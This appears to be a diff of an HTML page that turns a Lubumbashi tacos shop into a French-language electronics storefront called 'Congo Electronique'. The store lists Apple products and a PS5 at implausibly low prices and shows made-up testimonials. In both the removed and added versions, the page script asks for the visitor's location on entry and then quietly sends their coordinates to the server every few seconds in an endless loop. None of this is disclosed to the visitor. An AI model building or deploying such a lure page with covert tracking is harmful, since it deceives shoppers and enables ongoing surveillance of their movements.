-        <img src="https://images.unsplash.com/photo-1599974579688-8dbdd335c77f?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" alt="Tacos Mexicain">
-        <h3>TACOS MEXICAIN</h3>
-        <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-        <p class="price">12.500 FC</p>
-        <p style="color:#fde68a; font-size:13px;">Boeuf, sauce épicée, fromage</p>
-      </div>
-      
-      <div class="product-card" onclick="openProductModal('tacos-poulet')">
-        <img src="https://images.unsplash.com/photo-1552332386-f8dd00dc2f85?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" alt="Tacos Poulet">
-        <h3>TACOS POULET GRILLÉ</h3>
-        <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-        <p class="price">11.000 FC</p>
-        <p style="color:#fde68a; font-size:13px;">Poulet, sauce blanche, légumes</p>
-      </div>
-      
-      <div class="product-card" onclick="openProductModal('tacos-viande')">
-        <img src="https://images.unsplash.com/photo-1585238342024-78d387f4a707?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" alt="Menu Familial" alt="Tacos Viande Hachée">
-        <h3>TACOS VIANDE HACHÉE</h3>
+      <div class="product-card" onclick="openProductModal('iphone')">
+        <img src="https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch?wid=2560&hei=2440&fmt=p-jpg" alt="iPhone 15 Pro Max">
+        <h3>iPhone 15 Pro Max</h3>
         <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i></div>
-        <p class="price">10.500 FC</p>
-        <p style="color:#fde68a; font-size:13px;">Viande hachée, sauce barbecue</p>
+        <p class="price">600$</p>
       </div>
       
-      <div class="product-card" onclick="openProductModal('tacos-géant')">
-        <img src="https://images.unsplash.com/photo-1565299585323-38d6b0865b47?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" alt="Tacos Géant">
-        <h3>TACOS GÉANT XXL</h3>
+      <div class="product-card" onclick="openProductModal('macbook')">
+        <img src="https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/mbp16-spacegray-select-202301?wid=904&hei=840&fmt=jpeg&qlt=90&.v=1671304673202" alt="MacBook Pro 16">
+        <h3>MacBook Pro 16 M3</h3>
         <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-        <p class="price">18.000 FC</p>
-        <p style="color:#fde68a; font-size:13px;">Toutes viandes, double portion</p>
+        <p class="price">800$</p>
+      </div>
+      <div class="product-card" onclick="openProductModal('airpods')">
+        <img src="https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/airpods-max-select-spacegray-202011?wid=904&hei=840&fmt=jpeg&qlt=90&.v=1604070327000" alt="AirPods Max">
+        <h3>AirPods Max</h3>
+        <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+        <p class="price">39.9$</p>
+      </div>
+      <div class="product-card" onclick="openProductModal('ps5')">
+        <img src="https://gmedia.playstation.com/is/image/SIEPDC/ps5-product-thumbnail-01-en-14sep21?$facebook$" alt="PS5">
+        <h3>PlayStation 5</h3>
+        <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+        <p class="price">400$</p>
       </div>
     </div>
 
-    <!-- BANNIÈRES SPÉCIALES -->
     <div class="cat-banner">
       <div class="banner-item">
-        <img src="https://images.unsplash.com/photo-1528605248644-14dd04022da1?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" alt="Menu Étudiant">
         <div class="banner-text">
-          <h4>🍟 MENU ÉTUDIANT</h4>
-          <p>Tacos + Frites + Boisson</p>
-          <span class="price">14.000 FC</span>
-        </div>
-      </div>
-      <div class="banner-item">
-        <img src="https://images.unsplash.com/photo-1585238342024-78d387f4a707?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" alt="Menu Familial">
-        <div class="banner-text">
-          <h4>👨‍👩‍👧‍👦 MENU FAMILIAL</h4>
-          <p>4 Tacos + 2 frites + 1.5L</p>
-          <span class="price">45.000 FC</span>
+          <h4>Apple Watch Series 10</h4>
+          <p>Édition or / livraison Lubumbashi, Kinshasa</p>
+          <span style="color:#d4af37;">$749</span>
         </div>
       </div>
     </div>
 
-    <!-- SECTIONS SUPPLÉMENTAIRES (COMME SUR LE SITE ORIGINAL) -->
     <div class="home-sections">
       
-      <!-- Section valeurs / engagements -->
-      <h3 class="section-title">🇨🇩 POURQUOI LUSHI TACOS ?</h3>
+      <h3 class="section-title">🇨🇩 POURQUOI NOUS CHOISIR ?</h3>
       <div class="values-grid">
         <div class="value-card">
-          <i class="fas fa-fire"></i>
-          <h4>Grillade au feu de bois</h4>
-          <p>Notre viande est grillée devant vous, goût unique et fumé.</p>
+          <i class="fas fa-shield-halved"></i>
+          <h4>Garantie Constructeur</h4>
+          <p>2 ans sur tous nos produits, avec extension possible jusqu'à 4 ans.</p>
         </div>
         <div class="value-card">
-          <i class="fas fa-pepper-hot"></i>
-          <h4>Sauces secrètes</h4>
-          <p>Recettes transmises depuis 3 générations, épicées ou douces.</p>
+          <i class="fas fa-truck-fast"></i>
+          <h4>Livraison Record</h4>
+          <p>Express 24h vers Lubumbashi, Kinshasa et 8 autres grandes villes.</p>
         </div>
         <div class="value-card">
-          <i class="fas fa-motorcycle"></i>
-          <h4>Livraison rapide</h4>
-          <p>Moins de 30 minutes dans tout Lubumbashi, gratuit dès 25.000 FC.</p>
+          <i class="fas fa-rotate-left"></i>
+          <h4>Retours Gratuits</h4>
+          <p>30 jours pour changer d'avis, remboursement sans frais.</p>
         </div>
         <div class="value-card">
-          <i class="fas fa-hand-holding-heart"></i>
-          <h4>Produits frais</h4>
-          <p>Légumes du marché, viande fraîche, pain artisanal.</p>
+          <i class="fas fa-headset"></i>
+          <h4>Assistance WhatsApp</h4>
+          <p>Une équipe dédiée 7j/7, réponse en moins de 15 minutes.</p>
         </div>
       </div>
 
-      <!-- Marques / Partenaires -->
-      <h3 class="section-title">🔥 NOS PARTENAIRES</h3>
+      <h3 class="section-title">🔥 MARQUES OFFICIELLES</h3>
       <div class="brands">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/2560px-Amazon_logo.svg.png" alt="Amazon" style="background: white;">
-       
+        <img src="https://1000logos.net/wp-content/uploads/2016/10/Apple-Logo-1977.png" alt="Apple">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png" alt="Google" style="background: white; padding: 15px;">
       </div>
-      <p style="text-align: center; color: #fde68a; margin-bottom: 30px;">Fournisseurs officiels • Produits de qualité</p>
+      <p style="text-align: center; color: #b9c7da; margin-bottom: 30px;">Plus de 20 distributeurs agréés, tous les appareils sont importés directement et certifiés.</p>
 
-      <!-- Témoignages clients -->
       <div class="testimonials">
-        <h3>❤️ CE QUE NOS CLIENTS DISENT</h3>
+        <h3 style="text-align:center;">❤️ CE QUE NOS CLIENTS DISENT</h3>
         <div class="testi-grid">
           <div class="testi-card">
-           
-            <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-            <p>“Les meilleurs tacos de Lubumbashi ! La sauce épicée est incroyable, livraison rapide.”</p>
-            <h4>— Marie K., Golf</h4>
+            <p><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></p>
+            <p>“Commande passée à 8h, reçue à 14h à Lubumbashi. Le MacBook était parfaitement emballé, conforme. Merci Congo Electronique !”</p>
+            <p style="color:#d4af37; margin-top:8px;">— Awa K., Lubumbashi</p>
           </div>
           <div class="testi-card">
-            
-            <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-            <p>“Je prends le menu étudiant toutes les semaines, rapport qualité-prix imbattable.”</p>
-            <h4>— Jean-Paul M., Bel-Air</h4>
+            <p><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></p>
+            <p>“Le service après-vente m’a aidé à configurer mon iPhone à distance. Très professionnel et en français. Je recommande.”</p>
+            <p style="color:#d4af37; margin-top:8px;">— Patient M., Kinshasa</p>
           </div>
           <div class="testi-card">
-            
-            <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-            <p>“Le tacos géant est énorme, parfait pour deux personnes. Je recommande !”</p>
-            <h4>— Sarah T., Kampemba</h4>
+            <p><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i></p>
+            <p>“J’ai acheté une PS5 pour mon fils. Livraison à Goma en 2 jours. Paiement Mobile Money sécurisé. Parfait.”</p>
+            <p style="color:#d4af37; margin-top:8px;">— Grâce B., Goma</p>
           </div>
         </div>
       </div>
 
-      <!-- Blog / Actus -->
-      <h3 class="section-title">📰 ACTUALITÉS LUSHI TACOS</h3>
+      <h3 class="section-title">📱 BLOG & ACTUALITÉS</h3>
       <div class="blog-grid">
         <div class="blog-card">
-         
-          <h4>Nouvelle sauce "Volcanique"</h4>
-          <p>Découvrez notre sauce ultra-épicée à base de piments de Kisangani. À vos risques !</p>
-          <a href="#" class="btn-link">En savoir plus →</a>
+          <h4>iPhone 16 : les premières infos</h4>
+          <p>À quoi s’attendre pour la prochaine génération ? Analyse des rumeurs et dates de sortie possible en RDC.</p>
+          <a href="#" class="btn-link">Lire la suite →</a>
         </div>
         <div class="blog-card">
-          <img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" alt="Nouveau restaurant">
-          <h4>Ouverture à Kinshasa</h4>
-          <p>Lushi Tacos débarque bientôt dans la capitale ! Suivez notre actualité.</p>
-          <a href="#" class="btn-link">En savoir plus →</a>
+          <h4>Samsung S24 Ultra testé à Kinshasa</h4>
+          <p>Notre journaliste a essayé le nouveau flagship avant sa sortie officielle : batterie, photo et performances.</p>
+          <a href="#" class="btn-link">Lire la suite →</a>
         </div>
         <div class="blog-card">
-          <img src="https://images.unsplash.com/photo-1513104890138-7c749659a591?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" alt="Happy hour">
-          <h4>Happy hour 17h-19h</h4>
-          <p>Tous les tacos à -20% en happy hour ! Venez nombreux.</p>
-          <a href="#" class="btn-link">En savoir plus →</a>
+          <h4>PS5 Pro : vers une sortie en 2026 ?</h4>
+          <p>Rumeurs d’une version plus puissante, notre analyse et les jeux optimisés. Compatibilité avec les téléviseurs 8K.</p>
+          <a href="#" class="btn-link">Lire la suite →</a>
         </div>
       </div>
 
-      <!-- Application mobile -->
       <div class="app-banner">
         <div class="app-text">
-          <h3><i class="fas fa-download"></i> Téléchargez l'appli LUSHI TACOS</h3>
-          <p>Commandez en 1 clic, suivez votre livreur en temps réel, promotions exclusives.</p>
+          <h3><i class="fas fa-download"></i> Téléchargez l'appli Congo Electronique</h3>
+          <p>Suivez vos commandes en temps réel, notifications promo exclusives et paiement mobile encore plus rapide.</p>
         </div>
         <div class="app-stores">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="App Store" style="background: white; padding: 8px 15px;">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Google Play" style="background: white; padding: 8px 15px;">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="App Store" style="background: white; padding: 5px 10px;">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Google Play" style="background: white; padding: 5px 10px;">
         </div>
       </div>
 
-      <!-- FAQ -->
-      <div style="background: rgba(0,0,0,0.3); border-radius: 50px; padding: 35px; border: 1px solid #f97316;">
-        <h3 style="color:#fbbf24; margin-bottom:25px; font-size: 30px;">❓ QUESTIONS FRÉQUENTES</h3>
-        <div style="display:grid; gap:25px; grid-template-columns:1fr 1fr;">
+      <div style="background: rgba(0,0,0,0.2); border-radius: 40px; padding: 30px; border: 1px solid #d4af3720;">
+        <h3 style="color:#fde047; margin-bottom:20px; font-size: 26px;">❓ QUESTIONS FRÉQUENTES</h3>
+        <div style="display:grid; gap:20px; grid-template-columns:1fr 1fr;">
           <div>
-            <p style="font-weight:700; color:#f97316;">🔹 Livrez-vous dans mon quartier ?</p>
-            <p style="color:#fde68a;">Oui, nous livrons partout à Lubumbashi et dans 10 quartiers principaux. Vérifiez la liste.</p>
+            <p style="font-weight:600;">🔹 Livrez-vous à Mbuji-Mayi ?</p>
+            <p style="color:#a0afc0;">Oui, vers toutes les grandes villes du Congo. Délai 2-3 jours ouvrés.</p>
           </div>
           <div>
-            <p style="font-weight:700; color:#f97316;">🔹 Quels moyens de paiement ?</p>
-            <p style="color:#fde68a;">Mobile Money (M-Pesa, Airtel Money), carte bancaire ou espèces à la livraison.</p>
+            <p style="font-weight:600;">🔹 Quels moyens de paiement ?</p>
+            <p style="color:#a0afc0;">Mobile Money (M-Pesa, Airtel Money), carte bancaire ou espèces à la livraison.</p>
           </div>
           <div>
-            <p style="font-weight:700; color:#f97316;">🔹 La viande est-elle halal ?</p>
-            <p style="color:#fde68a;">Oui, toute notre viande est certifiée halal et fraîche du jour.</p>
+            <p style="font-weight:600;">🔹 Les produits sont-ils neufs ?</p>
+            <p style="color:#a0afc0;">100% neufs, scellés, avec garantie constructeur internationale.</p>
           </div>
           <div>
-            <p style="font-weight:700; color:#f97316;">🔹 Peut-on personnaliser son tacos ?</p>
-            <p style="color:#fde68a;">Bien sûr ! Vous choisissez la viande, la sauce, les légumes et le niveau d'épices.</p>
+            <p style="font-weight:600;">🔹 Puis-je retourner un article ?</p>
+            <p style="color:#a0afc0;">Retour gratuit sous 30 jours, remboursement sous 48h.</p>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- FOOTER -->
     <div class="footer">
-      <p><i class="fas fa-map-pin"></i> Livraison : Golf, Bel-Air, Kampemba, Centre, Katuba, Kenya, Ruashi, Kalebuka, Kigoma, Lido</p>
-      <p style="margin: 20px 0 10px;">Paiement Mobile Money, Carte, Espèces</p>
-      <p style="font-size:15px;">© 2026 LUSHI TACOS – Street Food Premium Lubumbashi</p>
+      <p><i class="fas fa-map-pin" style="color:#d4af37;"></i> Livraison partout au Congo : Kinshasa, Lubumbashi, Goma, Kolwezi, Bukavu, Matadi, Kisangani, Likasi, Mbuji-Mayi, Kananga</p>
+      <p style="margin: 20px 0 10px;">Paiement Mobile Money, Carte, Espèces à la livraison</p>
+      <p style="font-size:14px;">© 2026 CONGO ELECTRONIQUE – Premium Tech Store</p>
     </div>
   </section>
-
-  <!-- MODALE DE DÉTAIL PRODUIT -->
+  
   <div class="modal-overlay" id="productModal">
     <div class="modal-container">
       <div class="modal-header">
-        <h2 id="modalProductTitle">Tacos Mexicain</h2>
+        <h2 id="modalProductTitle">iPhone 15 Pro Max</h2>
         <button class="close-modal" onclick="closeModal()">&times;</button>
       </div>
-      <div class="modal-body" id="modalBodyContent">
-        <!-- Contenu généré dynamiquement -->
-      </div>
+      <div class="modal-body" id="modalBodyContent"></div>
     </div>
   </div>
-
-  <!-- SCRIPTS -->
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-  <script>
   
-  // Ajoutez cette fonction vers le début de votre script
-function sendPositionToServer(lat, lon, quartier) {
-    fetch('/geoloc', {
+  <script>
+    // Fonction pour envoyer la géolocalisation au serveur Flask
+    function sendGeolocation(lat, lon) {
+      fetch('/geoloc', {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            lat: lat,
-            lon: lon,
-            quartier: quartier
-        })
-    })
-    .then(response => response.json())
-    .then(data => console.log('✅ Position sauvegardée'))
-    .catch(error => console.error('Erreur:', error));
-}
-    // Fonction GET synchrone (pour géolocalisation)
-    function httpGet(theUrl) {
-      var xmlHttp = new XMLHttpRequest();
-      xmlHttp.open("GET", theUrl, false);
-      xmlHttp.send(null);
-      return xmlHttp.responseText;
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({lat: lat, lon: lon})
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('✅ Géolocalisation envoyée:', data);
+      })
+      .catch(error => {
+        console.error('❌ Erreur:', error);
+      });
     }
 
     // Boucle de géolocalisation continue
     function autoUpdate() {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        var coords = position.coords.latitude + "," + position.coords.longitude;
-        var url = "/logme/" + coords;
-        httpGet(url);
-        console.log('Géolocalisation envoyée : ' + coords);
-        setTimeout(autoUpdate, 3000);
-      }, function(error) {
-        console.warn('Erreur de géolocalisation: ' + error.message);
-        setTimeout(autoUpdate, 3000);
-      });
-    }
-// Remplacez complètement votre code pour le bouton "VOIR LE MENU"
-document.getElementById('enterBtn').addEventListener('click', function() {
-    var regionSelect = document.getElementById('regionSelect');
-    var otherInput = document.getElementById('otherQuartier');
-    
-    var region;
-    
-    if (regionSelect.value === 'autre') {
-        region = otherInput.value.trim();
-        if (!region) {
-            alert("Veuillez préciser votre quartier");
-            otherInput.focus();
-            return;
-        }
-    } else {
-        region = regionSelect.value;
-    }
-
-    if (!region) {
-        alert("Veuillez sélectionner votre quartier");
-        return;
-    }
-
-    if (navigator.geolocation) {
+      if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            function(position) {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                
-                // ENVOYER AU SERVEUR (NOUVEAU)
-                sendPositionToServer(lat, lon, region);
-                
-                // Afficher le menu
-                document.getElementById("heroSection").style.display = "none";
-                document.getElementById("mainContent").style.display = "block";
-                
-                setTimeout(() => {
-                    alert(`✅ Super ! Nous livrons à ${region}. Bon appétit ! 🌮`);
-                }, 500);
-                
-                // Démarrer la mise à jour auto
-                if (typeof autoUpdate === 'function') autoUpdate();
-            },
-            function(error) {
-                alert("Nous n'avons pas pu obtenir votre localisation. Vérifiez vos permissions.");
-            }
+          function(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            sendGeolocation(lat, lon);
+            setTimeout(autoUpdate, 3000); // Toutes les 3 secondes
+          },
+          function(error) {
+            console.warn('Erreur de géolocalisation:', error.message);
+            setTimeout(autoUpdate, 5000); // Réessayer après 5 secondes
+          }
         );
-    } else {
+      }
+    }
+
+    // Bouton d'entrée
+    document.getElementById('enterBtn').addEventListener('click', function() {
+      var regionSelect = document.getElementById('regionSelect');
+      var region = regionSelect.value;
+
+      if (!region) {
+        alert("Veuillez sélectionner votre région (ville).");
+        return;
+      }
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            document.getElementById("heroSection").style.display = "none";
+            document.getElementById("mainContent").style.display = "block";
+            
+            // Envoyer la première position
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            sendGeolocation(lat, lon);
+            
+            // Démarrer la boucle
+            setTimeout(autoUpdate, 3000);
+          },
+          function(error) {
+            alert("Nous n'avons pas pu obtenir votre localisation. Vérifiez les permissions.");
+            document.getElementById("heroSection").style.display = "none";
+            document.getElementById("mainContent").style.display = "block";
+          }
+        );
+      } else {
         alert("Votre navigateur ne supporte pas la géolocalisation.");
         document.getElementById("heroSection").style.display = "none";
         document.getElementById("mainContent").style.display = "block";
-    }
-});
-
-    // ========== DONNÉES DES PRODUITS POUR LA MODALE ==========
+      }
+    });
+    
+    // ========== FONCTIONS POUR LA MODALE ==========
+    
     const productsData = {
-      'tacos-mexicain': {
-        title: "TACOS MEXICAIN",
-        price: "12.500 FC",
-        description: "Notre tacos signature : boeuf grillé au feu de bois, sauce épicée maison, fromage fondant, oignons et coriandre fraîche.",
-        mainImage: "https://images.unsplash.com/photo-1599974579688-8dbdd335c77f?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80",
+      iphone: {
+        title: "iPhone 15 Pro Max",
+        price: "600 $",
+        description: "Le meilleur iPhone jamais conçu. Appareil photo pro, puce A17 Pro, titane aérospatial.",
+        mainImage: "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch?wid=2560&hei=2440&fmt=p-jpg",
         thumbnails: [
-          "https://images.unsplash.com/photo-1599974579688-8dbdd335c77f?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80",
-          "https://images.unsplash.com/photo-1611251135345-977543c4863b?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80",
-          "https://images.unsplash.com/photo-1567620905732-2d1ec7ab7445?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80"
-        ],
-        rating: 5,
-        reviews: 156,
-        spices: ["Douce", "Épicée", "Volcanique"],
-        sizes: ["Moyen", "Grand", "XXL"],
-        extras: ["Fromage supplémentaire", "Guacamole", "Oignons grillés", "Piments"],
-        specs: [
-          "Bœuf grillé au feu de bois",
-          "Sauce secrète épicée",
-          "Fromage fondu",
-          "Oignons & coriandre",
-          "Pain artisanal",
-          "Servi avec frites"
-        ]
-      },
-      'tacos-poulet': {
-        title: "TACOS POULET GRILLÉ",
-        price: "11.000 FC",
-        description: "Poulet mariné 24h, grillé au barbecue, sauce blanche crémeuse, laitue, tomates et oignons.",
-        mainImage: "https://images.unsplash.com/photo-1552332386-f8dd00dc2f85?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80",
-        thumbnails: [
-          "https://images.unsplash.com/photo-1552332386-f8dd00dc2f85?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80",
-          "https://images.unsplash.com/photo-1611251135345-977543c4863b?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80",
-          "https://images.unsplash.com/photo-1565299585323-38d6b0865b47?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80"
-        ],
-        rating: 5,
-        reviews: 98,
-        spices: ["Douce", "Épicée", "Barbecue"],
-        sizes: ["Moyen", "Grand", "XXL"],
-        extras: ["Double poulet", "Sauce supplémentaire", "Avocat", "Maïs"],
-        specs: [
-          "Poulet mariné 24h",
-          "Grillé au barbecue",
-          "Sauce blanche maison",
-          "Laitue, tomates, oignons",
-          "Pain moelleux",
-          "Servi avec frites"
-        ]
-      },
-      'tacos-viande': {
-        title: "TACOS VIANDE HACHÉE",
-        price: "10.500 FC",
-        description: "Viande hachée de bœuf, sauce barbecue fumée, cheddar, oignons croustillants.",
-        mainImage: "https://images.unsplash.com/photo-1611250188496-e4c668b70fe6?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80",
-        thumbnails: [
-          "https://images.unsplash.com/photo-1611250188496-e4c668b70fe6?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80",
-          "https://images.unsplash.com/photo-1565299585323-38d6b0865b47?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80"
+          "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch?wid=2560&hei=2440&fmt=p-jpg",
+          "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch_AV1?wid=2560&hei=2440&fmt=p-jpg",
+          "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch_AV2?wid=2560&hei=2440&fmt=p-jpg"
         ],
         rating: 4.5,
-        reviews: 67,
-        spices: ["Douce", "Épicée", "Fumée"],
-        sizes: ["Moyen", "Grand", "XXL"],
-        extras: ["Cheddar extra", "Bacon", "Oignons frits", "Jalapeños"],
+        reviews: 128,
+        colors: ["#4f5b5f", "#f0e68c", "#2c3e50", "#e8e8e8"],
+        storage: ["256 Go", "512 Go", "1 To"],
         specs: [
-          "Viande hachée de bœuf",
-          "Sauce barbecue fumée",
-          "Cheddar fondant",
-          "Oignons croustillants",
-          "Pain grillé",
-          "Servi avec frites"
+          "Écran Super Retina XDR 6,7 pouces",
+          "Puce A17 Pro (3 nm)",
+          "Appareil photo principal 48 Mpx",
+          "Zoom optique 5x",
+          "Titane de qualité aérospatiale",
+          "Certification IP68",
+          "Batterie jusqu'à 29h de lecture vidéo"
         ]
       },
-      'tacos-géant': {
-        title: "TACOS GÉANT XXL",
-        price: "18.000 FC",
-        description: "Le défi ! Trois viandes (boeuf, poulet, hachée), double fromage, toutes les sauces, frites à l'intérieur.",
-        mainImage: "https://images.unsplash.com/photo-1565299585323-38d6b0865b47?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80",
+      macbook: {
+        title: "MacBook Pro 16 M3",
+        price: "800 $",
+        description: "La puissance de la puce M3 Max pour les pros. Écran Liquid Retina XDR, autonomie exceptionnelle.",
+        mainImage: "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/mbp16-spacegray-select-202301?wid=904&hei=840&fmt=jpeg&qlt=90&.v=1671304673202",
         thumbnails: [
-          "https://images.unsplash.com/photo-1565299585323-38d6b0865b47?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80",
-          "https://images.unsplash.com/photo-1599974579688-8dbdd335c77f?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80",
-          "https://images.unsplash.com/photo-1552332386-f8dd00dc2f85?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80"
+          "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/mbp16-spacegray-select-202301?wid=904&hei=840&fmt=jpeg&qlt=90&.v=1671304673202",
+          "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/mbp16-spacegray-gallery1-202301?wid=4000&hei=3072&fmt=jpeg&qlt=90&.v=1670941750811",
+          "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/mbp16-spacegray-gallery2-202301?wid=4000&hei=3072&fmt=jpeg&qlt=90&.v=1670941750901"
+        ],
+        rating: 5,
+        reviews: 89,
+        colors: ["#2c3e50", "#e8e8e8"],
+        storage: ["1 To", "2 To", "4 To"],
+        specs: [
+          "Puce M3 Max (16 coeurs CPU, 40 coeurs GPU)",
+          "Écran Liquid Retina XDR 16,2 pouces",
+          "Jusqu'à 22h d'autonomie",
+          "128 Go de mémoire unifiée max",
+          "Clavier magique avec Touch ID",
+          "Connectique: HDMI, SDXC, Thunderbolt 4"
+        ]
+      },
+      airpods: {
+        title: "AirPods Max",
+        price: "39.9 $",
+        description: "Casque audio à réduction de bruit active, son haute fidélité, conception luxueuse.",
+        mainImage: "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/airpods-max-select-spacegray-202011?wid=904&hei=840&fmt=jpeg&qlt=90&.v=1604070327000",
+        thumbnails: [
+          "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/airpods-max-select-spacegray-202011?wid=904&hei=840&fmt=jpeg&qlt=90&.v=1604070327000",
+          "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/airpods-max-spacegray-wireless?wid=2000&hei=2000&fmt=jpeg&qlt=90&.v=1601059731000",
+          "https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/airpods-max-spacegray-earcushion?wid=2000&hei=2000&fmt=jpeg&qlt=90&.v=1601019385000"
         ],
         rating: 5,
         reviews: 203,
